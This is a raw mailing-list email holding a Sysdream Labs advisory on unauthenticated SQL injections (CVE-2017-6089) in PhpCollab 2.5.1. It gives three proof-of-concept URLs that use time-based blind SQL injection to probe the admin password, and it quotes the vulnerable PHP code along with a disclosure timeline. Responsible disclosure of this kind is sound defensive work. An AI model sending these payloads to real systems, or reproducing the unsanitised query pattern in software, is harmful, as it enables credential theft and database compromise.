X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5435" "Friday" "29" "September" "2017" "16:30:10" "+0200" "Sysdream Labs" "labs@sysdream.com" "<e40934eb-c030-dc42-3a21-6f50daa62159@sysdream.com>" "186" "[oss-security] [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections (unauthenticated)" "^Cc:" nil nil "9" "2017092914:30:10" "[oss-security] [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections (unauthenticated)" (number mark "U       labs@sysdrea Sep 29  186/5435  " thread-indent "\"[oss-security] [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections (unauthenticated)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3841 invoked by uid 550); 29 Sep 2017 14:30:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3816 invoked from network); 29 Sep 2017 14:30:32 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 836441A1880
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1506695419;
	bh=xg2OdVnxfJHb9o/iFhZGz925vKJWqm8OmbHiESt81FY=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=fvgc4IioLN4Aw5aOJ0aVbYuCqt+8jCRg28Wldo2jeDuUWV8/TfCoal2ssTb4PQvpf
	 /nL6O1d247Hm/J9eLVAzIFnVnaSlvCtr+3ZiNwBs91kJ42EbPi5/7QI8X9n0/SLHW2
	 z0ndLK4yrQBb/iUpwx2/ptwN/LkmC6CIRJ5kBqDU=
X-Virus-Scanned: amavisd-new at sysdream.com
Message-ID: <e40934eb-c030-dc42-3a21-6f50daa62159@sysdream.com>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.2.1
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="Ge49fAm2OgkMXlQWVj2pC7qcnllacVTJe"
Cc: oss-security@lists.openwall.com
Date: Fri, 29 Sep 2017 16:30:10 +0200
From: Sysdream Labs <labs@sysdream.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections
 (unauthenticated)
To: fulldisclosure@seclists.org

--Ge49fAm2OgkMXlQWVj2pC7qcnllacVTJe
Content-Type: multipart/mixed; boundary="0FAm7FxH9VWUfdEOAvrfJDEf1j9dflCGi";
 protected-headers="v1"
From: Sysdream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org
Cc: oss-security@lists.openwall.com
Message-ID: <e40934eb-c030-dc42-3a21-6f50daa62159@sysdream.com>
Subject: [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections
 (unauthenticated)

--0FAm7FxH9VWUfdEOAvrfJDEf1j9dflCGi
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections (unauthenticated)

## Description

PhpCollab is an open source web-based project management system, that enabl=
es collaboration across the Internet.

## SQL injections

The phpCollab code does not correctly filter arguments, allowing arbitrary =
SQL code execution by an unauthenticated user.

**CVE ID**: CVE-2017-6089

**Access Vector**: remote

**Security Risk**: Critical

**Vulnerability**: CWE-89

**CVSS Base Score**: 10 (Critical)

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:H

## Proof of Concept 1

The following HTTP request allows an attacker to extract data using SQL inj=
ections in either the `project` or `id` parameter  (it requires at least on=
e topic):

```
http://phpCollab.lan/topics/deletetopics.php?project=3D1'+and+(SELECT+SLEEP=
(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+lik=
e+CHAR(116))+and+'2'=3D'2

http://phpCollab.lan/topics/deletetopics.php?project=3D1&id=3D1+and+(SELECT=
+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,=
1)+like+CHAR(116))
```

### Vulnerable code

The vulnerable code is found in `topics/deletetopics.php`, line 9.

```
if ($action =3D=3D "delete") {
    $id =3D str_replace("**",",",$id);
    $tmpquery1 =3D "DELETE FROM ".$tableCollab["topics"]." WHERE id =3D $id=
";
    $tmpquery2 =3D "DELETE FROM ".$tableCollab["posts"]." WHERE topic =3D $=
id";
    $pieces =3D explode(",",$id);
    $num =3D count($pieces);
    connectSql("$tmpquery1");
    connectSql("$tmpquery2");
```


## Proof of Concept 2

The following HTTP request allows an attacker to extract data using SQL inj=
ections in the `id` parameter (it requires at least one saved bookmark):

```
http://phpCollab.lan/bookmarks/deletebookmarks.php?action=3Ddelete&id=3Dsel=
ect+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password=
,1,1)+like+CHAR(116)
```

### Vulnerable code

The vulnerable code is found in `bookmarks/deletebookmarks.php`, line 32.

```
if ($action =3D=3D "delete") {
	$id =3D str_replace("**",",",$id);
	$tmpquery1 =3D "DELETE FROM ".$tableCollab["bookmarks"]." WHERE id IN($id)=
";
	connectSql("$tmpquery1");
```


## Proof of Concept 3

The following HTTP request allows an attacker to extract some information u=
sing SQL injection in the `id` parameter (it requires at least one calendar=
 entry):

```
http://phpCollab.lan/calendar/deletecalendar.php?project=3D&action=3Ddelete=
&id=3Dselect+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr=
(password,1,1)+like+CHAR(116)
```

### Vulnerable code

The vulnerable code is found in `calendar/deletecalendar.php`, line 31.

```
if ($action =3D=3D "delete") {
	$id =3D str_replace("**",",",$id);
	$tmpquery1 =3D "DELETE FROM ".$tableCollab["calendar"]." WHERE id IN($id)";
	connectSql("$tmpquery1");
```

**Notes**
The application probably needs a security posture against injections, so ot=
her parameters and pages may be vulnerables. This advisory does not intend =
to be an exhaustive list of vulnerable parameters.


## Solution

Update to the latest version avalaible.

## Affected versions

* Version <=3D 2.5.1

## Timeline (dd/mm/yyyy)

* 27/08/2016 : Initial discovery.
* 05/10/2016 : Initial contact.
* 11/10/2016 : GPG Key exchange.
* 19/10/2016 : Advisory sent to vendor.
* 13/02/2017 : First fixes.
* 15/02/2017 : Fixes validation by Sysdream.
* 21/02/2017 : PhpCollab ask to wait before publish.
* 21/06/2017 : New version has been released.
* 29/09/2017 : Public disclosure.

## Credits

* Nicolas SERRA, Sysdream  (n.serra -at- sysdream -dot- com)

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--0FAm7FxH9VWUfdEOAvrfJDEf1j9dflCGi--

--Ge49fAm2OgkMXlQWVj2pC7qcnllacVTJe
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEER9HhJMQ++ZIqLhVRjrSM2dWyWaEFAlnOWPIACgkQjrSM2dWy
WaHnqRAAomOOGxNQgksJ9G2vhAKkLQXRHyGJ8+3+Qp9dr9rR+vguao/jUObSTIUd
flRMnQsAtjFEF0rC/j6Ay6b7N7qAdcJOV2XPFaef+He69RQwA64+eyiGe40nqM3K
s7rjhAge4u7XwMwExD2b1PeGHnxMxpNtwI9wZ1oCshA66lEy4QXIu4u0qoMAP5Or
f2D3StmzUaYHTZXJ9njyQSJjCAtAbP51PYd87XCQarcJN0XP/vd1NbztjAIFGqVr
+qcfdHkvYF6irH3DUmLfQHcVXL5BxHyFLn47iYubcHrxbbgWut/1jxsk9zjpnUE1
NZBNlqWOSk3gBYszKgMj1l//7NfjYIBSG0f+vO2HbS3IGP0iGNX+qn96LjeeAmT9
HCsVsAHFFJRmI+kDHpX1hfdvDN5mowwE8oKeQsG4EXeIJsYaYDzBTWIHYMW7fdKA
HEmOkxJ4riNYFhrvM9UkegFh3WjSdGv53sLEls78xAzzkj3HrNQva5k62ArSF6Qz
pXiSwhUsNvNRBdUsc/Oz4WJyErTqT4AvO4SBaUfdc74ew82U/n+1AsKK6AuEsFBV
8VZs6yfJ6WCUX9nkDpXlGO1lvNFMmh9OwjQotaxKq6J9ETVc1iWdw0BfogqCmyPv
tY8xbI/aydX0PsUP9MEj4ghGw6rOMNHLM0w6oh+rf9UkEOlW1AI=
=ZEhN
-----END PGP SIGNATURE-----

--Ge49fAm2OgkMXlQWVj2pC7qcnllacVTJe--
